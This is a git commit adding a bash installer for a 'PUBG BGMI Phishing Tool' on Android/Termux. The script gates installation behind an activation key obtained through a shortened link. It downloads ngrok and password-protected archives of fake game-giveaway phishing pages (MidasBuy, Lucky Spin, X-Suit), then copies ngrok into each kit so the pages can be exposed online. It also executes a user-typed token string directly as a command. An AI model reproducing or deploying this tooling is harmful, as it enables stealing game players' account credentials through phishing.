f948cf81c2bb0f018253aedb90ff2e910a30c757
SUMAM MONDAL <63942767+Online-Hacking@users.noreply.github.com>
2021-08-02 10:28:52 +0530

    Update and rename pro to Android-Setup.sh

---
+++ OnlineHacking/SUMAN/PUBG-BGMI/SM/OH/Android-Setup.sh
@@ -0,0 +1,112 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
+echo -e ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e ""
+echo -e "\e[33m
+██╗  ██╗███████╗██╗   ██╗
+██║ ██╔╝██╔════╝╚██╗ ██╔╝
+█████╔╝ █████╗   ╚████╔╝
+██╔═██╗ ██╔══╝    ╚██╔╝
+██║  ██╗███████╗   ██║
+╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
+echo ""
+echo ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/3xgXUiT  "
+echo ""
+echo ""
+read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Admin Activation Key : \e[0m' option
+echo""
+echo""
+echo""
+if [[ $option == *'4BMX25TWUVHE7HK7'* ]]; then
+clear
+echo ""
+echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
+echo ""
+termux-setup-storage
+sudo apt-get install apache2 -y
+apt install 
+apt install ruby -y
+apt install php -y
+apt install jq -y
+apt install tail -y
+apt install curl -y
+apt install zip -y
+apt install unrar -y
+apt install rar -y
+pkg install wget -y
+pkg install ruby -y
+pkg install gem -y
+gem install lolcat
+clear
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
+unzip ngrok-stable-linux-arm.zip
+wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-PUBG.rar
+wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SUMAN-BGMI.rar
+unrar x -Password SUMAN-PUBG.rar
+unrar x -Password SUMAN-BGMI.rar
+rm -rf ngrok-stable-linux-arm.zip  SUMAN-PUBG.rar SUMAN-BGMI.rar
+cp -R ngrok SUMAN/Collect-EVENT-LINE/
+cp -R ngrok SUMAN/Collect-MC-Larent-Car/
+cp -R ngrok SUMAN/Lucky-Spin-Godzila-S19/
+cp -R ngrok SUMAN/MidasBuy/
+cp -R ngrok SUMAN/SPIN-EVENT/
+cp -R ngrok SUMAN/X-Suit/
+cp -R ngrok SUMAN1/COLLECT-S19-ID/
+cp -R ngrok SUMAN1/Godzilla-LuckySpin/
+cp -R ngrok SUMAN1/RPS19-COLLECT/
+cp -R ngrok SUMAN1/X-Suit-LuckySpin/
+chmod 7777 OnlineHacking-Phishing
+clear
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+sleep 1
+echo ""
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+sleep2
+echo
+clear
+echo
+echo
+echo
+echo -e "\e[35m[+] Connect Online Hacking PUBG BGMI Hacking Server......  \e[m "
+sleep 4
+echo
+echo
+clear
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+sleep 4
+echo
+echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Script for Android \e[m \e[21"
+echo
+echo
+echo -e "\e[92m[+] To Run the Tool type :\e[93m ./OnlineHacking-Phishing \e[m "
+echo
+fi
+sleep 3
+echo
+exit
